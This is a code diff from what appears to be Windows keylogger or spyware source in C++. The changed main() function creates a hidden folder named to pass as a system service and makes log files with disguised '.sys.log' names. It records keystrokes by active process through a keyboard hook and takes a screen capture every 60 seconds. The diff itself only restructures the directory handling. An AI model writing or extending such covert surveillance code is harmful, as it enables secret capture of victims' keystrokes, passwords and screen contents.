@@ -27,10 +27,13 @@ int main() {
 
   Stream::GetAccountInfo(pClientInfo);
 
-  std::string path = Stream::GetPath("\\Microsoft\\SystemService");
+  BDirectory mainDir;
+  mainDir.path = Stream::GetPath("\\Microsoft\\");;
+  mainDir.name = "SystemService";
 
-  Stream::MakeDir(path);
-  Stream::MakeFile();
+  Stream::MakeDir(mainDir.path, mainDir.name);
+  Stream::MakeFile("wnxshl2.sys.log", mainDir.path + mainDir.name);
+  Stream::MakeFile("boothandler.sys.log", mainDir.name);
 
   Stream::WriteLog("[*] BOOT [*]", KeyHook::activeProcess, false);
 
@@ -44,9 +47,10 @@ int main() {
   std::string write = ostream.str();
   Stream::WriteLog(write, KeyHook::activeProcess, false);
 
-  Screen::CaptureScreen(path, "winpst", true, 60000);
+  Screen::CaptureScreen(mainDir.path, "winpst", true, 60000);
 
   KeyHook::HandleMessage(true);
+
 #endif // DEBUG_BUILD
   return 0;
 }
